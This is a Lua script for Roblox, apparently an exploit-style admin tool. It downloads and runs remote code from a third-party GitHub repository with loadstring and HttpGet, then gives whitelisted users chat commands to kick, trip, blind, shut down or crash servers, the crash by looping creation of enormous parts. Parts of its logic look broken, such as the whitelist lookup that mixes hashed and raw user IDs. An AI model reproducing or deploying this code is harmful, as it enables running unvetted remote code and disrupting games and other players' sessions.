local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")

-- Load SHA-512 hash library
local hashModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/itziceless/Galaxy/refs/heads/main/libs/hash", true))()

-- Fetch whitelist JSON from GitHub (raw link)
local success, whitelist = pcall(function()
    local url = "https://raw.githubusercontent.com/YourUsername/YourRepo/main/whitelist.json"
    local jsonData = game:HttpGet(url, true)
    return HttpService:JSONDecode(jsonData)
end)

if not success then
    warn("Failed to load whitelist:", whitelist)
    whitelist = {} -- fallback empty table
end

-- Table for chat tags
local tags = {}

local function tagPlayer(player, tagName, tagColor)
    tags[player.Name] = {txt = tagName, col = tagColor}
end

-- Rank check
local function canTarget(adminData, targetData)
    if not adminData or not targetData then return false end
    return tonumber(adminData.type) > tonumber(targetData.type)
end

-- Commands
local commands = {
    kick = function(target, admin, args)
        if target then target:Kick(table.concat(args," ") or "Kicked by "..admin.Name) end
    end,
    trip = function(target)
        local hum = target.Character and target.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum:ChangeState(Enum.HumanoidStateType.FallingDown) end
    end,
    blind = function(target)
        local gui = Instance.new("ScreenGui", CoreGui)
        gui.IgnoreGuiInset = true
        local frame = Instance.new("Frame", gui)
        frame.Size = UDim2.fromScale(1,1)
        frame.BackgroundColor3 = Color3.new(0,0,0)
        frame.BackgroundTransparency = 0
    end,
    shutdown = function(target)
        game:Shutdown()
    end,
    crash = function(target)
        task.spawn(function()
            repeat
                local part = Instance.new("Part")
                part.Size = Vector3.new(1e10,1e10,1e10)
                part.Parent = Workspace
            until false
        end)
    end
}

-- Add admin behavior
local function addAdmin(player, data)
    tagPlayer(player, data.tag, data.color)

    player.Chatted:Connect(function(msg)
        local split = msg:split(" ")
        local cmdName = split[1]:lower():gsub("!", "")
        table.remove(split,1)
        local targetName = split[1]
        table.remove(split,1)
        local args = split

        local target = targetName and Players:FindFirstChild(targetName) or nil
        if commands[cmdName] and target then
            if canTarget(data, whitelist[tostring(target.UserId)]) then
                commands[cmdName](target, player, args)
            else
                warn(player.Name.." cannot target "..target.Name.." due to rank.")
            end
        end
    end)
end

-- Chat tag application
TextChatService.OnIncomingMessage = function(msg)
    local p = Instance.new("TextChatMessageProperties")
    if msg.TextSource then
        local plr = Players:GetPlayerByUserId(msg.TextSource.UserId)
        if plr and tags[plr.Name] then
            local d = tags[plr.Name]
            p.PrefixText = "<font color='"..d.col.."'>["..d.txt.."]</font> "..msg.PrefixText
        end
    end
    return p
end

-- Initialize admins for current players
for _, player in ipairs(Players:GetPlayers()) do
    local hashed = hashModule.sha512(tostring(player.UserId))
    for _, data in pairs(whitelist) do
        if data.userid == hashed then
            addAdmin(player, data)
        end
    end
end

-- Initialize admins for new players
Players.PlayerAdded:Connect(function(player)
    local hashed = hashModule.sha512(tostring(player.UserId))
    for _, data in pairs(whitelist) do
        if data.userid == hashed then
            addAdmin(player, data)
        end
    end
end)
